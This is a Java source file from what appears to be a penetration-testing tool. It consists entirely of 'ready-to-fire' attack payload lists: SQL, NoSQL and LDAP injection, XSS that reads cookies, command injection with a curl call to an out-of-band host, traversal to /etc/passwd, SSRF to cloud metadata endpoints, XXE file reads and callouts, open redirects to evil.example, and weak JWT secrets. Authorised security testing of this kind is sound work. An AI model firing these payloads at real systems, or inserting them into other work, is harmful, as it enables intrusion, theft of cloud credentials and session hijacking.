package com.owaspsentinel.payload;

import java.util.Arrays;
import java.util.List;

/**
 * Curated, ready-to-fire payloads grouped by attack class. These are meant as a
 * fast starting point you can copy straight into Repeater/Intruder during an
 * authorised test — not an exhaustive fuzz list. Keep them legal-to-use and
 * non-destructive by default (no DROP TABLE, no rm, etc.).
 */
public final class PayloadLibrary {

    private PayloadLibrary() {}

    public static final List<String> SQLI = Arrays.asList(
            "'", "\"", "`", "')", "\"))",
            "' OR '1'='1", "' OR '1'='1'-- -", "\" OR \"1\"=\"1",
            "admin'-- -", "admin'#", "' OR 1=1-- -",
            "1' ORDER BY 1-- -", "1' ORDER BY 10-- -",
            "1' UNION SELECT NULL-- -", "1' UNION SELECT NULL,NULL-- -",
            "1 AND 1=1", "1 AND 1=2",
            "' AND SLEEP(5)-- -", "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -",
            "1);SELECT pg_sleep(5)-- -", "' WAITFOR DELAY '0:0:5'-- -",
            "' AND 1=CONVERT(int,@@version)-- -",
            "%27%20OR%20%271%27%3D%271",
            "{\"$gt\":\"\"}", "{\"$ne\":null}"   /* NoSQL */
    );

    public static final List<String> XSS = Arrays.asList(
            "<script>alert(document.domain)</script>",
            "\"><script>alert(1)</script>",
            "'><svg/onload=alert(1)>",
            "<img src=x onerror=alert(document.cookie)>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "javascript:alert(1)",
            "\" autofocus onfocus=alert(1) x=\"",
            "</textarea><script>alert(1)</script>",
            "{{constructor.constructor('alert(1)')()}}",   /* template / AngularJS */
            "${alert(1)}",
            "<details open ontoggle=alert(1)>",
            "<iframe srcdoc=\"<script>alert(1)</script>\">",
            "%3Cscript%3Ealert(1)%3C/script%3E"
    );

    public static final List<String> COMMAND_INJECTION = Arrays.asList(
            ";id", "|id", "||id", "&&id", "`id`", "$(id)",
            "; whoami", "| whoami", "\n id \n",
            ";ping -c 4 127.0.0.1", "& ping -n 4 127.0.0.1 &",
            "$(curl http://OOB_HOST)", "`nslookup OOB_HOST`",
            "%0aid", "%26id", "%3Bid"
    );

    public static final List<String> PATH_TRAVERSAL = Arrays.asList(
            "../../../../etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..\\..\\..\\..\\windows\\win.ini",
            "/etc/passwd%00", "file:///etc/passwd",
            "....\\\\....\\\\windows\\win.ini"
    );

    public static final List<String> SSRF = Arrays.asList(
            "http://127.0.0.1/", "http://localhost/", "http://0.0.0.0/",
            "http://169.254.169.254/latest/meta-data/",                 // AWS IMDSv1
            "http://169.254.169.254/latest/api/token",                  // IMDSv2 probe
            "http://metadata.google.internal/computeMetadata/v1/",      // GCP
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01", // Azure
            "http://[::1]/", "http://0177.0.0.1/", "http://2130706433/", // 127.0.0.1 obfuscation
            "http://localhost#@evil.com/", "http://evil.com%2f@127.0.0.1/",
            "gopher://127.0.0.1:6379/_INFO",
            "dict://127.0.0.1:11211/stats",
            "file:///etc/passwd",
            "http://burpcollaborator-or-your-oob-host/"
    );

    public static final List<String> XXE = Arrays.asList(
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://OOB_HOST/x\">]><foo>&xxe;</foo>",
            "<!DOCTYPE r [<!ENTITY % ext SYSTEM \"http://OOB_HOST/dtd\">%ext;]>"   /* OOB / blind */
    );

    public static final List<String> OPEN_REDIRECT = Arrays.asList(
            "https://evil.example", "//evil.example", "/\\evil.example",
            "https:evil.example", "https://target.com.evil.example",
            "https://target.com@evil.example", "/%2f%2fevil.example",
            "https://evil.example%23.target.com", "javascript:alert(document.domain)"
    );

    public static final List<String> LDAP_INJECTION = Arrays.asList(
            "*", "*)(uid=*))(|(uid=*", "*)(|(objectclass=*", "admin)(&)", "x' or 1=1 or 'x'='y"
    );

    public static final List<String> IDOR = Arrays.asList(
            "Decrement/increment the numeric id (e.g. 1001 -> 1000, 1002)",
            "Swap the id/UUID for another user's known value",
            "Replace your id with a guessable admin id (1, 2, 100, 1000)",
            "Change the resource id but keep your own session token",
            "Try negative / zero / very large ids",
            "Wrap the id in an array: id[]=1&id[]=2 (mass-assign / 2nd object)"
    );

    /** Algorithm-confusion / weak-key cracking notes for JWTs. */
    public static final List<String> JWT_SECRETS = Arrays.asList(
            "secret", "password", "changeme", "jwt_secret", "your-256-bit-secret",
            "key", "admin", "1234567890", "supersecret", "<crack with hashcat -m 16500>"
    );

    public static List<String> forSubtype(String subtype) {
        String s = subtype.toLowerCase();
        if (s.contains("sql")) return SQLI;
        if (s.contains("xss") || s.contains("cross-site script")) return XSS;
        if (s.contains("command")) return COMMAND_INJECTION;
        if (s.contains("traversal") || s.contains("lfi") || s.contains("file include")) return PATH_TRAVERSAL;
        if (s.contains("ssrf")) return SSRF;
        if (s.contains("xxe") || s.contains("xml ext")) return XXE;
        if (s.contains("redirect")) return OPEN_REDIRECT;
        if (s.contains("ldap")) return LDAP_INJECTION;
        if (s.contains("idor") || s.contains("access control") || s.contains("bola")) return IDOR;
        return Arrays.asList();
    }
}
